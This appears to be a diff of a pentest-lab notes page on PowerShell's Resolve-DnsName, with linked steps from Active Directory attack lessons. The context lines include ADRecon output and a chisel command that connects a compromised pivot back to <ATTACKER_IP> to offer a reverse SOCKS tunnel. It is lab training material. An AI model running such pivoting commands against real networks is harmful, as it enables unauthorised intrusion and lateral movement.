@@ -9,6 +9,32 @@ hideFooterPagination: true
 
 {/* Generated from Commands/resolve-dnsname.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Resolve-DnsName: choose the operation and read the result
+
+Find the IP address of a computer such as MS01; use the lab DNS server if the default lookup fails.
+
+### What the result establishes
+
+Read the returned record type, answer and responding resolver; distinguish authoritative data from cached results.
+
+### Prerequisites and common failures
+
+An A record is not an SRV record, and a hostname resolving on one machine does not prove it resolves on your pivot.
+
+### Example 1: Commands
+
+Run in: **Windows PowerShell**. Replace DOMAIN and DC_IP with the lab domain and its DNS/DC address.
+
+```powershell
+Resolve-DnsName -Name MS01 -Type A
+Resolve-DnsName -Name MS01.DOMAIN -Server DC_IP -Type A
+(Resolve-DnsName -Name MS01.DOMAIN -Server DC_IP -Type A).IPAddress
+```
+
+## Saved commands and notebook recipes
+
+Find the IP address of a computer such as MS01; use the lab DNS server if the default lookup fails.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=resolve-dnsname) · [All tools](/index)
@@ -71,6 +97,13 @@ PS C:\htb> .\ADRecon.ps1
 [*] Output Directory: C:\Tools\ADRecon-Report-20220328092458
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Additional AD Auditing Tools — Running ADRecon](/active-directory/auditing-tools#running-adrecon)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Step 1 — Build a SOCKS tunnel through the pivot (chisel)">
@@ -83,6 +116,13 @@ PS C:\htb> .\ADRecon.ps1
 :: On the PIVOT (MS01) — connect back and offer SOCKS
 c:\tools\chisel.exe client <ATTACKER_IP>:8080 R:socks
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Linux — Step 1 — Build a SOCKS tunnel through the pivot (chisel)](/password-attacks/pass-the-ticket-from-linux#step-1-—-build-a-socks-tunnel-through-the-pivot-chisel)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -98,6 +138,21 @@ c:\tools\chisel.exe client <ATTACKER_IP>:8080 R:socks
 172.16.1.5  ms01.inlanefreight.htb ms01
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Linux — Step 4 — Fake DNS with /etc/hosts](/password-attacks/pass-the-ticket-from-linux#step-4-—-fake-dns-with-/etc/hosts)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [DNS Enumeration and Zone Transfers](/enumeration/dns-enumeration-domain-name-system)
+
+{/* VAULT_RELATED_END */}
